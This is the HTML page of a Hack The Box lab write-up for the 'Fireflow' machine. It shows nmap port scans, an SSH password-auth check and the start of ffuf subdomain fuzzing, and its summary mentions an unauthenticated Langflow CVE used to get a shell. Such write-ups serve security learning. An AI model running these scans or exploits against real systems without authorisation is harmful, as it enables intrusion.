@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Fireflow | Paracausal Telemetry</title><meta name="description" content="Medium Hack The Box Linux machine, written up by Ethan Bauer. Covers SSH (22), HTTP (443), flow subdomain." /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-fireflow/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="Fireflow" /><meta property="og:description" content="Medium Hack The Box Linux machine, written up by Ethan Bauer. Covers SSH (22), HTTP (443), flow subdomain." /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-fireflow/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-fireflow/og.png?v=aedfd65e" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Fireflow" /><meta name="twitter:description" content="Medium Hack The Box Linux machine, written up by Ethan Bauer. Covers SSH (22), HTTP (443), flow subdomain." /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-fireflow/og.png?v=aedfd65e" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"Fireflow","description":"Medium Hack The Box Linux machine, written up by Ethan Bauer. Covers SSH (22), HTTP (443), flow subdomain.","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-fireflow/","datePublished":"2026-08-22","keywords":"Hack The Box, Linux","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"Fireflow","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-fireflow/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">Fireflow</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-08-22 · 15 min read</p><h1>Fireflow</h1><p>Medium Hack The Box Linux machine, written up by Ethan Bauer. Covers SSH (22), HTTP (443), flow subdomain.</p><div class="writeup-meta"><span class="writeup-chip">Difficulty · medium</span><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-linux" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M12.504 0c-.155 0-.315.008-.48.021-4.226.333-3.105 4.807-3.17 6.298-.076 1.092-.3 1.953-1.05 3.02-.885 1.051-2.127 2.75-2.716 4.521-.278.832-.41 1.684-.287 2.489a.424.424 0 00-.11.135c-.26.268-.45.6-.663.839-.199.199-.485.267-.797.4-.313.136-.658.269-.864.68-.09.189-.136.394-.132.602 0 .199.027.4.055.536.058.399.116.728.04.97-.249.68-.28 1.145-.106 1.484.174.334.535.47.94.601.81.2 1.91.135 2.774.6.926.466 1.866.67 2.616.47.526-.116.97-.464 1.208-.946.587-.003 1.23-.269 2.26-.334.699-.058 1.574.267 2.577.2.025.134.063.198.114.333l.003.003c.391.778 1.113 1.132 1.884 1.071.771-.06 1.592-.536 2.257-1.306.631-.765 1.683-1.084 2.378-1.503.348-.199.629-.469.649-.853.023-.4-.2-.811-.714-1.376v-.097l-.003-.003c-.17-.2-.25-.535-.338-.926-.085-.401-.182-.786-.492-1.046h-.003c-.059-.054-.123-.067-.188-.135a.357.357 0 00-.19-.064c.431-1.278.264-2.55-.173-3.694-.533-1.41-1.465-2.638-2.175-3.483-.796-1.005-1.576-1.957-1.56-3.368.026-2.152.236-6.133-3.544-6.139zm.529 3.405h.013c.213 0 .396.062.584.198.19.135.33.332.438.533.105.259.158.459.166.724 0-.02.006-.04.006-.06v.105a.086.086 0 01-.004-.021l-.004-.024a1.807 1.807 0 01-.15.706.953.953 0 01-.213.335.71.71 0 00-.088-.042c-.104-.045-.198-.064-.284-.133a1.312 1.312 0 00-.22-.066c.05-.06.146-.133.183-.198.053-.128.082-.264.088-.402v-.02a1.21 1.21 0 00-.061-.4c-.045-.134-.101-.2-.183-.333-.084-.066-.167-.132-.267-.132h-.016c-.093 0-.176.03-.262.132a.8.8 0 00-.205.334 1.18 1.18 0 00-.09.4v.019c.002.089.008.179.02.267-.193-.067-.438-.135-.607-.202a1.635 1.635 0 01-.018-.2v-.02a1.772 1.772 0 01.15-.768c.082-.22.232-.406.43-.533a.985.985 0 01.594-.2zm-2.962.059h.036c.142 0 .27.048.399.135.146.129.264.288.344.465.09.199.14.4.153.667v.004c.007.134.006.2-.002.266v.08c-.03.007-.056.018-.083.024-.152.055-.274.135-.393.2.012-.09.013-.18.003-.267v-.015c-.012-.133-.04-.2-.082-.333a.613.613 0 00-.166-.267.248.248 0 00-.183-.064h-.021c-.071.006-.13.04-.186.132a.552.552 0 00-.12.27.944.944 0 00-.023.33v.015c.012.135.037.2.08.334.046.134.098.2.166.268.01.009.02.018.034.024-.07.057-.117.07-.176.136a.304.304 0 01-.131.068 2.62 2.62 0 01-.275-.402 1.772 1.772 0 01-.155-.667 1.759 1.759 0 01.08-.668 1.43 1.43 0 01.283-.535c.128-.133.26-.2.418-.2zm1.37 1.706c.332 0 .733.065 1.216.399.293.2.523.269 1.052.468h.003c.255.136.405.266.478.399v-.131a.571.571 0 01.016.47c-.123.31-.516.643-1.063.842v.002c-.268.135-.501.333-.775.465-.276.135-.588.292-1.012.267a1.139 1.139 0 01-.448-.067 3.566 3.566 0 01-.322-.198c-.195-.135-.363-.332-.612-.465v-.005h-.005c-.4-.246-.616-.512-.686-.71-.07-.268-.005-.47.193-.6.224-.135.38-.271.483-.336.104-.074.143-.102.176-.131h.002v-.003c.169-.202.436-.47.839-.601.139-.036.294-.065.466-.065zm2.8 2.142c.358 1.417 1.196 3.475 1.735 4.473.286.534.855 1.659 1.102 3.024.156-.005.33.018.513.064.646-1.671-.546-3.467-1.089-3.966-.22-.2-.232-.335-.123-.335.59.534 1.365 1.572 1.646 2.757.13.535.16 1.104.021 1.67.067.028.135.06.205.067 1.032.534 1.413.938 1.23 1.537v-.043c-.06-.003-.12 0-.18 0h-.016c.151-.467-.182-.825-1.065-1.224-.915-.4-1.646-.336-1.77.465-.008.043-.013.066-.018.135-.068.023-.139.053-.209.064-.43.268-.662.669-.793 1.187-.13.533-.17 1.156-.205 1.869v.003c-.02.334-.17.838-.319 1.35-1.5 1.072-3.58 1.538-5.348.334a2.645 2.645 0 00-.402-.533 1.45 1.45 0 00-.275-.333c.182 0 .338-.03.465-.067a.615.615 0 00.314-.334c.108-.267 0-.697-.345-1.163-.345-.467-.931-.995-1.788-1.521-.63-.4-.986-.87-1.15-1.396-.165-.534-.143-1.085-.015-1.645.245-1.07.873-2.11 1.274-2.763.107-.065.037.135-.408.974-.396.751-1.14 2.497-.122 3.854a8.123 8.123 0 01.647-2.876c.564-1.278 1.743-3.504 1.836-5.268.048.036.217.135.289.202.218.133.38.333.59.465.21.201.477.335.876.335.039.003.075.006.11.006.412 0 .73-.134.997-.268.29-.134.52-.334.74-.4h.005c.467-.135.835-.402 1.044-.7zm2.185 8.958c.037.6.343 1.245.882 1.377.588.134 1.434-.333 1.791-.765l.211-.01c.315-.007.577.01.847.268l.003.003c.208.199.305.53.391.876.085.4.154.78.409 1.066.486.527.645.906.636 1.14l.003-.007v.018l-.003-.012c-.015.262-.185.396-.498.595-.63.401-1.746.712-2.457 1.57-.618.737-1.37 1.14-2.036 1.191-.664.053-1.237-.2-1.574-.898l-.005-.003c-.21-.4-.12-1.025.056-1.69.176-.668.428-1.344.463-1.897.037-.714.076-1.335.195-1.814.12-.465.308-.797.641-.984l.045-.022zm-10.814.049h.01c.053 0 .105.005.157.014.376.055.706.333 1.023.752l.91 1.664.003.003c.243.533.754 1.064 1.189 1.637.434.598.77 1.131.729 1.57v.006c-.057.744-.48 1.148-1.125 1.294-.645.135-1.52.002-2.395-.464-.968-.536-2.118-.469-2.857-.602-.369-.066-.61-.2-.723-.4-.11-.2-.113-.602.123-1.23v-.004l.002-.003c.117-.334.03-.752-.027-1.118-.055-.401-.083-.71.043-.94.16-.334.396-.4.69-.533.294-.135.64-.202.915-.47h.002v-.002c.256-.268.445-.601.668-.838.19-.201.38-.336.663-.336zm7.159-9.074c-.435.201-.945.535-1.488.535-.542 0-.97-.267-1.28-.466-.154-.134-.28-.268-.373-.335-.164-.134-.144-.333-.074-.333.109.016.129.134.199.2.096.066.215.2.36.333.292.2.68.467 1.167.467.485 0 1.053-.267 1.398-.466.195-.135.445-.334.648-.467.156-.136.149-.267.279-.267.128.016.034.134-.147.332a8.097 8.097 0 01-.69.468zm-1.082-1.583V5.64c-.006-.02.013-.042.029-.05.074-.043.18-.027.26.004.063 0 .16.067.15.135-.006.049-.085.066-.135.066-.055 0-.092-.043-.141-.068-.052-.018-.146-.008-.163-.065zm-.551 0c-.02.058-.113.049-.166.066-.047.025-.086.068-.14.068-.05 0-.13-.02-.136-.068-.01-.066.088-.133.15-.133.08-.031.184-.047.259-.005.019.009.036.03.03.05v.02h.003z"/></svg>OS · Linux</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Linux</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/Fireflow" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-fireflow.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head room-card-has-icon"><img src="/writeups/meta/htb/machine-fireflow.webp" width="56" height="56" alt="" loading="lazy" decoding="async" /><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>Fireflow</h2><p>Fireflow is a medium difficulty Linux machine that starts off with a leaked Langflow flow_id. With this, an attacker is able to exploit the unauthenticated CVE-2026-33017 and get a shell as www-data on the remote machine. There, he will find that a password in Langflow&#39;s .env…</p></div><span class="room-badge room-badge-medium">Medium</span></div><dl class="room-facts"><div><dt>Released</dt><dd>23 Jun 2026</dd></div><div><dt>Retired</dt><dd>Yes</dd></div><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-linux" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M12.504 0c-.155 0-.315.008-.48.021-4.226.333-3.105 4.807-3.17 6.298-.076 1.092-.3 1.953-1.05 3.02-.885 1.051-2.127 2.75-2.716 4.521-.278.832-.41 1.684-.287 2.489a.424.424 0 00-.11.135c-.26.268-.45.6-.663.839-.199.199-.485.267-.797.4-.313.136-.658.269-.864.68-.09.189-.136.394-.132.602 0 .199.027.4.055.536.058.399.116.728.04.97-.249.68-.28 1.145-.106 1.484.174.334.535.47.94.601.81.2 1.91.135 2.774.6.926.466 1.866.67 2.616.47.526-.116.97-.464 1.208-.946.587-.003 1.23-.269 2.26-.334.699-.058 1.574.267 2.577.2.025.134.063.198.114.333l.003.003c.391.778 1.113 1.132 1.884 1.071.771-.06 1.592-.536 2.257-1.306.631-.765 1.683-1.084 2.378-1.503.348-.199.629-.469.649-.853.023-.4-.2-.811-.714-1.376v-.097l-.003-.003c-.17-.2-.25-.535-.338-.926-.085-.401-.182-.786-.492-1.046h-.003c-.059-.054-.123-.067-.188-.135a.357.357 0 00-.19-.064c.431-1.278.264-2.55-.173-3.694-.533-1.41-1.465-2.638-2.175-3.483-.796-1.005-1.576-1.957-1.56-3.368.026-2.152.236-6.133-3.544-6.139zm.529 3.405h.013c.213 0 .396.062.584.198.19.135.33.332.438.533.105.259.158.459.166.724 0-.02.006-.04.006-.06v.105a.086.086 0 01-.004-.021l-.004-.024a1.807 1.807 0 01-.15.706.953.953 0 01-.213.335.71.71 0 00-.088-.042c-.104-.045-.198-.064-.284-.133a1.312 1.312 0 00-.22-.066c.05-.06.146-.133.183-.198.053-.128.082-.264.088-.402v-.02a1.21 1.21 0 00-.061-.4c-.045-.134-.101-.2-.183-.333-.084-.066-.167-.132-.267-.132h-.016c-.093 0-.176.03-.262.132a.8.8 0 00-.205.334 1.18 1.18 0 00-.09.4v.019c.002.089.008.179.02.267-.193-.067-.438-.135-.607-.202a1.635 1.635 0 01-.018-.2v-.02a1.772 1.772 0 01.15-.768c.082-.22.232-.406.43-.533a.985.985 0 01.594-.2zm-2.962.059h.036c.142 0 .27.048.399.135.146.129.264.288.344.465.09.199.14.4.153.667v.004c.007.134.006.2-.002.266v.08c-.03.007-.056.018-.083.024-.152.055-.274.135-.393.2.012-.09.013-.18.003-.267v-.015c-.012-.133-.04-.2-.082-.333a.613.613 0 00-.166-.267.248.248 0 00-.183-.064h-.021c-.071.006-.13.04-.186.132a.552.552 0 00-.12.27.944.944 0 00-.023.33v.015c.012.135.037.2.08.334.046.134.098.2.166.268.01.009.02.018.034.024-.07.057-.117.07-.176.136a.304.304 0 01-.131.068 2.62 2.62 0 01-.275-.402 1.772 1.772 0 01-.155-.667 1.759 1.759 0 01.08-.668 1.43 1.43 0 01.283-.535c.128-.133.26-.2.418-.2zm1.37 1.706c.332 0 .733.065 1.216.399.293.2.523.269 1.052.468h.003c.255.136.405.266.478.399v-.131a.571.571 0 01.016.47c-.123.31-.516.643-1.063.842v.002c-.268.135-.501.333-.775.465-.276.135-.588.292-1.012.267a1.139 1.139 0 01-.448-.067 3.566 3.566 0 01-.322-.198c-.195-.135-.363-.332-.612-.465v-.005h-.005c-.4-.246-.616-.512-.686-.71-.07-.268-.005-.47.193-.6.224-.135.38-.271.483-.336.104-.074.143-.102.176-.131h.002v-.003c.169-.202.436-.47.839-.601.139-.036.294-.065.466-.065zm2.8 2.142c.358 1.417 1.196 3.475 1.735 4.473.286.534.855 1.659 1.102 3.024.156-.005.33.018.513.064.646-1.671-.546-3.467-1.089-3.966-.22-.2-.232-.335-.123-.335.59.534 1.365 1.572 1.646 2.757.13.535.16 1.104.021 1.67.067.028.135.06.205.067 1.032.534 1.413.938 1.23 1.537v-.043c-.06-.003-.12 0-.18 0h-.016c.151-.467-.182-.825-1.065-1.224-.915-.4-1.646-.336-1.77.465-.008.043-.013.066-.018.135-.068.023-.139.053-.209.064-.43.268-.662.669-.793 1.187-.13.533-.17 1.156-.205 1.869v.003c-.02.334-.17.838-.319 1.35-1.5 1.072-3.58 1.538-5.348.334a2.645 2.645 0 00-.402-.533 1.45 1.45 0 00-.275-.333c.182 0 .338-.03.465-.067a.615.615 0 00.314-.334c.108-.267 0-.697-.345-1.163-.345-.467-.931-.995-1.788-1.521-.63-.4-.986-.87-1.15-1.396-.165-.534-.143-1.085-.015-1.645.245-1.07.873-2.11 1.274-2.763.107-.065.037.135-.408.974-.396.751-1.14 2.497-.122 3.854a8.123 8.123 0 01.647-2.876c.564-1.278 1.743-3.504 1.836-5.268.048.036.217.135.289.202.218.133.38.333.59.465.21.201.477.335.876.335.039.003.075.006.11.006.412 0 .73-.134.997-.268.29-.134.52-.334.74-.4h.005c.467-.135.835-.402 1.044-.7zm2.185 8.958c.037.6.343 1.245.882 1.377.588.134 1.434-.333 1.791-.765l.211-.01c.315-.007.577.01.847.268l.003.003c.208.199.305.53.391.876.085.4.154.78.409 1.066.486.527.645.906.636 1.14l.003-.007v.018l-.003-.012c-.015.262-.185.396-.498.595-.63.401-1.746.712-2.457 1.57-.618.737-1.37 1.14-2.036 1.191-.664.053-1.237-.2-1.574-.898l-.005-.003c-.21-.4-.12-1.025.056-1.69.176-.668.428-1.344.463-1.897.037-.714.076-1.335.195-1.814.12-.465.308-.797.641-.984l.045-.022zm-10.814.049h.01c.053 0 .105.005.157.014.376.055.706.333 1.023.752l.91 1.664.003.003c.243.533.754 1.064 1.189 1.637.434.598.77 1.131.729 1.57v.006c-.057.744-.48 1.148-1.125 1.294-.645.135-1.52.002-2.395-.464-.968-.536-2.118-.469-2.857-.602-.369-.066-.61-.2-.723-.4-.11-.2-.113-.602.123-1.23v-.004l.002-.003c.117-.334.03-.752-.027-1.118-.055-.401-.083-.71.043-.94.16-.334.396-.4.69-.533.294-.135.64-.202.915-.47h.002v-.002c.256-.268.445-.601.668-.838.19-.201.38-.336.663-.336zm7.159-9.074c-.435.201-.945.535-1.488.535-.542 0-.97-.267-1.28-.466-.154-.134-.28-.268-.373-.335-.164-.134-.144-.333-.074-.333.109.016.129.134.199.2.096.066.215.2.36.333.292.2.68.467 1.167.467.485 0 1.053-.267 1.398-.466.195-.135.445-.334.648-.467.156-.136.149-.267.279-.267.128.016.034.134-.147.332a8.097 8.097 0 01-.69.468zm-1.082-1.583V5.64c-.006-.02.013-.042.029-.05.074-.043.18-.027.26.004.063 0 .16.067.15.135-.006.049-.085.066-.135.066-.055 0-.092-.043-.141-.068-.052-.018-.146-.008-.163-.065zm-.551 0c-.02.058-.113.049-.166.066-.047.025-.086.068-.14.068-.05 0-.13-.02-.136-.068-.01-.066.088-.133.15-.133.08-.031.184-.047.259-.005.019.009.036.03.03.05v.02h.003z"/></svg><span>Linux</span></dd></div><div><dt>Creator</dt><dd>amra13579</dd></div><div><dt>Rating</dt><dd>4.6 / 5</dd></div><div><dt>User owns</dt><dd>4,822</dd></div><div><dt>Root owns</dt><dd>3,253</dd></div><div><dt>User blood</dt><dd>HTB-Bot<small class="room-blood-time">0H 0M 3S</small></dd></div><div><dt>Root blood</dt><dd>HTB-Bot<small class="room-blood-time">0H 0M 3S</small></dd></div></dl><div class="room-charts"><figure class="room-chart"><figcaption>Rated difficulty</figcaption><svg viewBox="0 0 254 64" role="img" aria-label="Player-rated difficulty, 2694 votes from easiest to hardest"><rect x="0" y="50" width="20" height="14" rx="2" fill="hsl(96 70% 55%)"><title>136 votes</title></rect><rect x="26" y="47" width="20" height="17" rx="2" fill="hsl(96 70% 55%)"><title>170 votes</title></rect><rect x="52" y="0" width="20" height="64" rx="2" fill="hsl(80 70% 55%)"><title>627 votes</title></rect><rect x="78" y="9" width="20" height="55" rx="2" fill="hsl(70 70% 55%)"><title>534 votes</title></rect><rect x="104" y="8" width="20" height="56" rx="2" fill="hsl(50 70% 55%)"><title>546 votes</title></rect><rect x="130" y="36" width="20" height="28" rx="2" fill="hsl(38 70% 55%)"><title>276 votes</title></rect><rect x="156" y="39" width="20" height="25" rx="2" fill="hsl(28 70% 55%)"><title>241 votes</title></rect><rect x="182" y="55" width="20" height="9" rx="2" fill="hsl(16 70% 55%)"><title>92 votes</title></rect><rect x="208" y="62" width="20" height="2" rx="2" fill="hsl(8 70% 55%)"><title>24 votes</title></rect><rect x="234" y="59" width="20" height="5" rx="2" fill="hsl(0 70% 55%)"><title>48 votes</title></rect></svg></figure><figure class="room-chart room-radar"><figcaption>Player profile</figcaption><svg viewBox="-60 0 340 230" role="img" aria-label="Radar graph out of 10: Enumeration 6.1, Real-Life 5.8, CVE 5.9, Custom Exploitation 4.1, CTF-Like 4.2"><polygon points="110.0,92.5 126.6,104.6 120.3,124.2 99.7,124.2 93.4,104.6" class="radar-ring"/><polygon points="110.0,75.0 143.3,99.2 130.6,138.3 89.4,138.3 76.7,99.2" class="radar-ring"/><polygon points="110.0,57.5 159.9,93.8 140.9,152.5 79.1,152.5 60.1,93.8" class="radar-ring"/><polygon points="110.0,40.0 176.6,88.4 151.1,166.6 68.9,166.6 43.4,88.4" class="radar-ring"/><line x1="110" y1="110" x2="110.0" y2="40.0" class="radar-ring"/><line x1="110" y1="110" x2="176.6" y2="88.4" class="radar-ring"/><line x1="110" y1="110" x2="151.1" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="68.9" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="43.4" y2="88.4" class="radar-ring"/><polygon points="110.0,67.3 148.6,97.5 134.3,143.4 93.1,133.2 82.0,100.9" class="radar-shape"/><text x="110.0" y="25.8" text-anchor="middle">Enumeration</text><text x="193.9" y="86.7" text-anchor="start">Real-Life</text><text x="161.8" y="185.4" text-anchor="start">CVE</text><text x="58.2" y="185.4" text-anchor="end">Custom Exploitation</text><text x="26.1" y="86.7" text-anchor="end">CTF-Like</text></svg></figure></div><p class="room-link"><a href="https://app.hackthebox.com/machines/Fireflow" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><h2>Enumeration</h2><h3>Open ports</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p- --min-rate=2000 -sT 10.129.48.171
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-22 17:02 +0100
+Nmap scan report for 10.129.48.171
+Host is up (0.018s latency).
+Not shown: 62762 closed tcp ports (conn-refused), 2771 filtered tcp ports (no-response)
+PORT    STATE SERVICE
+22/tcp  open  ssh
+443/tcp open  https
+
+Nmap done: 1 IP address (1 host up) scanned in 14.11 seconds</code></pre><h3>Nmap</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p 22,443 -A --min-rate=2000 -sT 10.129.48.171  
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-22 17:04 +0100
+Nmap scan report for fireflow.htb (10.129.48.171)
+Host is up (0.013s latency).
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
+|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
+443/tcp open  ssl/http nginx
+|_http-title: FireFlow \xE2\x80\x94 Task Force Nightfall
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|   http/1.1
+|   http/1.0
+|_  http/0.9
+| ssl-cert: Subject: commonName=fireflow.htb/organizationName=Task Force Nightfall/countryName=US
+| Subject Alternative Name: DNS:fireflow.htb, DNS:*.fireflow.htb
+| Not valid before: 2026-04-14T16:35:31
+|_Not valid after:  2028-07-17T16:35:31
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p>Nmap detects the domain <code>fireflow.htb</code></p><h2>SSH (22)</h2><h3>Auth method</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ssh root@fireflow.htb                   
+The authenticity of host &#39;fireflow.htb (10.129.48.171)&#39; can&#39;t be established.
+ED25519 key fingerprint is: SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;fireflow.htb&#39; (ED25519) to the list of known hosts.
+root@fireflow.htb&#39;s password:</code></pre><p>Password based authentication</p><h2>HTTP (443)</h2><h3>Subdomains</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ffuf -u https://fireflow.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H &#39;Host: FUZZ.fireflow.htb&#39; -ic -c -t 30 -fs 162
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://fireflow.htb/
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+ :: Header           : Host: FUZZ.fireflow.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 30
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 162
+________________________________________________
+
